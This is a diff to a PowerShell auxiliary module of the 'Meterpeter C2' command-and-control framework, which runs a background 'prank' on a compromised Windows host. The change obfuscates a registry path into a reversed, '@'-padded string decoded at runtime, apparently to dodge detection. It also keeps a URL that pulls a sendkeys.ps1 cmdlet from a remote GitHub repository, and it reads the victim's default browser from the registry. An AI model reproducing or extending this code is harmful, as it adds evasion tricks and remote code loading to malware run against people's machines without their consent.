@@ -6,7 +6,7 @@
    Tested Under: Windows 10 (19044) x64 bits
    Required Dependencies: none
    Optional Dependencies: none
-   PS cmdlet Dev version: v1.0.3
+   PS cmdlet Dev version: v1.0.4
 
 .DESCRIPTION
    Auxiliary module of Meterpeter C2 v2.10.13 that executes an prank in background.
@@ -54,10 +54,6 @@
 
 #Global variable declarations
 $ErrorActionPreference = "SilentlyContinue"
-$DefaultSettingPath = 'HKCU:\SOFTWARE\Microsoft\Windows\Shell\Associations\UrlAssociations\http\UserChoice'
-$SendKeyscmdlet = "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/sendkeys.ps1"
-
-
 #Store operative system version
 $OsVersion = [System.Environment]::OSVersion.Version.Major
 If([string]::IsNullOrEmpty($OsVersion))
@@ -67,7 +63,10 @@ If([string]::IsNullOrEmpty($OsVersion))
    return
 }
 
+
 #Store default web browser name
+$RegexDecode = (([regex]::Matches("ecioh@Cre@sU\pt@th\sno@ita@icos@sAlrU\snoita@ico@ssA\lle@hS\swod@niW\tf@os@orciM\ERA@WTF@OS\:UCK@H",'.','RightToLeft')|ForEach{$_.value}) -join '')
+$DefaultSettingPath = "$RegexDecode" -replace '@',''
 $DefaultBrowserName = (Get-Item -Path "$DefaultSettingPath"|Get-ItemProperty).ProgId
 If([string]::IsNullOrEmpty($DefaultBrowserName))
 {
@@ -76,11 +75,12 @@ If([string]::IsNullOrEmpty($DefaultBrowserName))
    return
 }
 
+
 #Create PSDrive to HKEY_CLASSES_ROOT
 $null = New-PSDrive -PSProvider registry -Root 'HKEY_CLASSES_ROOT' -Name 'HKCR'
 
 #Get the default browser executable command/path
-$DefaultBrowserOpenCommand = (Get-Item "HKCR:\$DefaultBrowserName\shell\open\command" | Get-ItemProperty).'(default)'
+$DefaultBrowserOpenCommand = (Get-Item "HKCR:\$DefaultBrowserName\shell\open\command"|Get-ItemProperty).'(default)'
 $DefaultBrowserPathSanitize = [regex]::Match($DefaultBrowserOpenCommand,'\".+?\"')
 Remove-PSDrive -Name 'HKCR'
 
@@ -93,6 +93,7 @@ If([string]::IsNullOrEmpty($DefaultBrowserPathSanitize))
 
 #Sanitize command
 $DefaultBrowserPath = $DefaultBrowserPathSanitize.value -replace '"',''
+$SendKeyscmdlet = "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Misc-CmdLets/sendkeys.ps1"
 
 #Select the OS version to run
 If($OsVersion -match '^(xp)$')
